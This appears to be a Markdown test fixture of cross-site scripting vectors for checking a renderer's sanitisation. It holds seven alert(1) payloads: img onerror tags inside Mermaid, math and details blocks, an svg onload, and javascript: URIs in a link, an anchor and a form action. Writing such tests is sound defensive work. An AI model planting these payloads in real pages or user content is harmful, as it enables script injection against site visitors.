# XSS Test Vectors

## Mermaid XSS 1
```mermaid
graph TD
    A["<img src=x onerror=alert(1)>"] --> B
```

## Math XSS
$\text{<img src=x onerror=alert(1)>}$

## HTML details
<details>
<summary>Click me</summary>
<img src=x onerror="alert(1)">
</details>

## SVG
<svg onload="alert(1)">

## Link javascript
[test](javascript:alert(1))

## Anchor href
<a href="javascript:alert(1)">click</a>

## Form action
<form action="javascript:alert(1)"><input type=submit></form>
